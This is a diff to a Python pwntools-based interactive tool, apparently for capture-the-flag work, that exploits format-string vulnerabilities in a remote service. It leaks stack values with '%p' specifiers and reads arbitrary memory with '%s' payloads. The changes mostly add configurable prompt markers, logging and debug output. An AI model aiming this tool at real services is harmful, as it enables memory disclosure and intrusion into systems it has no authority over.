@@ -4,16 +4,22 @@ import re
 
 from shell import Command
 
+import logging
+
 class NoConnectionException(Exception):
     pass
 
 class PrintfShell(shell.Shell):
-    def __init__(self, read, write, marker=b"$ ", conn=None):
+    def __init__(self, read, write, marker=b"$ ", conn=None, initial_marker=None, prefix_response=None):
         shell.Shell.__init__(self)
         self.read = read
         self.write = write
         self.conn = conn
+        self.initial_marker = initial_marker
         self.marker = marker
+        if not initial_marker:
+            self.initial_marker = self.marker
+        self.prefix = prefix_response
         # Stack Offset is the first argument index. THat is
         # printf("%{self.stack_offset}$s") will print the format string.
         self.stack_offset = None
@@ -21,6 +27,10 @@ class PrintfShell(shell.Shell):
         self.stack_base = None
         # format location is the memory address of the start of the format string buffer
         self.format_location = None
+
+    @Command
+    def set_marker(self, marker):
+        self.marker = marker
 
     @Command
     def raw(self, *args):
@@ -39,18 +49,21 @@ class PrintfShell(shell.Shell):
     def connect(self, address, port):
         port = int(port)
         self.conn = pwnlib.tubes.remote.remote(address, port)
-        self.conn.recvuntil(self.marker)
+        logging.info(f"Connected. Awaiting '{self.initial_marker}'")
+        self.conn.recvuntil(self.initial_marker)
         self.stack_base = None
         self.stack_offset = None
         self.format_location = None
         print(self.conn)
     
-    def read_response(self, string, marker=None):
-        if marker is None:
-            marker = self.marker
+    def read_response(self, string):
+        marker = self.marker
         string = self.write(string)
         self.conn.send(string)
+        if self.prefix:
+            self.conn.recvuntil(self.prefix)
         resp = self.conn.recvuntil(marker)
+        print(resp, resp[:-len(marker)])
         return self.read(resp[:-len(marker)])
     
     @Command
@@ -61,6 +74,7 @@ class PrintfShell(shell.Shell):
         stack = []
         for i in range(1, n+1):
             value = self.read_response(bytes(f"%{i}$p\x00", 'ascii'))
+            print(value)
             stack.append(value)
         print(stack)
         for index, value in enumerate(stack):
@@ -129,7 +143,7 @@ class PrintfShell(shell.Shell):
             print("need to set the stack offset `set_offset`")
             return  
         def read_command(stack_offset):
-            command = bytes(f"%{self.stack_offset+stack_offset}$sXX", "ascii")
+            command = bytes(f"%{self.stack_offset+stack_offset}$s", "ascii")
             padn = (8 - len(command) % 8) % 8
             pad = b"\x00"*padn
             return command + pad
@@ -165,12 +179,13 @@ class PrintfShell(shell.Shell):
                 command = read_command(4)
             else:
                 command = read_command(1) + suffix
-            res = self.read_response(command, marker="XX$ ")
+            res = self.read_response(command)
             res = res + b"\x00"
             all_bytes += res
             offset = len(all_bytes)
         print(all_bytes)
         return all_bytes
 
-shell = PrintfShell(read=lambda x: x, write=lambda x:x+b"\n")
-shell.runloop()
+if __name__ == "__main__":
+    shell = PrintfShell(read=lambda x: x, write=lambda x:x+b"\n")
+    shell.runloop()
